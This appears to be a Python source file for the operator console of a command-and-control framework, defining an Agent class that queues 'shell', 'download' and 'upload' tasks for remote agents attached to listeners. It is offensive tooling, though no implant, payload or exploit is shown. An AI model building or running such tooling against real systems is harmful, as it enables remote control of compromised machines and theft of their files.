import menu
from util import *
import os

class Agent:
    def __init__(self,name,listener,remoteip,hostname):
        self.name = name
        self.listener = listener
        self.hostname = hostname
        self.remoteip = remoteip
        self.menu = menu.Menu(self.name)
        self.Path = "data/listeners/{}/agents/{}/".format(self.listener,self.name)
        self.tasksPath = "{}tasks".format(self.Path,self.name)
        self.downloadPath ="{}download".format(self.Path,self.name)
        self.secretPath ="{}secret".format(self.Path,self.name)
        self.uploadPath ="{}upload".format(self.Path,self.name)
        if os.path.exists(self.Path) == False:
            os.mkdir(self.Path)
        self.menu.registerCommand("shell","Execute a shell command","<command>")
        self.menu.registerCommand("download","download","<path>")
        self.menu.registerCommand("quit","Task agent to quit.", "")
        self.menu.registerCommand("upload","upload","<path>")
        
        

    def writeTask(self,task):
        with open(self.tasksPath,"w") as f:
            f.write(task)

    def writeDl(self,path):
        with open(self.downloadPath,"w") as f:
            f.write(path)

    def writeSecret(self,secret):
        
        with open(self.secretPath,"w") as f:
            f.write(secret)

    def writeUpload(self,upload):
        with open(self.uploadPath,"w") as f:
            f.write(upload)
    


    def shell(self,args):
        if len(args) == 0:
            error("Missing args")
        else:
            command = " ".join(args)
            task = "shell " + command
            self.writeTask(task)
    def download(self,args):
        if len(args) == 0:
            error("Missing args")
        elif len(args)> 1:
            error("Too much args")
        else :
            path =" ".join(args)
            self.writeDl(path)

    def upload(self,args):
        if len(args) == 0:
            error("Missing args")
        elif len(args)> 1:
            error("Too much args")
        else :
            path =" ".join(args)
            self.writeUpload(path)

    def ev(self,command, args):
        if command == "help":
            self.menu.showHelp()
        elif command == "shell":
            self.shell(args)
        elif command == "home":
            menu.main_menu()
        elif command == "quit":
            menu.main_back()
        elif command == "download" :
            self.download(args)
        elif command == "upload" :
            self.upload(args)
        else:
            print("Command not found")
    
        
    def clearTasks(self):
        if os.path.exists(self.tasksPath):
            os.remove(self.tasksPath)
    def clearDownload(self):
        if os.path.exists(self.downloadPath):
            os.remove(self.downloadPath)
    def clearSecret(self):
        if os.path.exists(self.secretPath):
            os.remove(self.secretPath)
    def clearUpload(self):
        if os.path.exists(self.uploadPath):
            os.remove(self.uploadPath)
    def interact(self):
        while True:
            try:
                command, args = self.menu.parse()
            except:
                continue
            self.ev(command,args)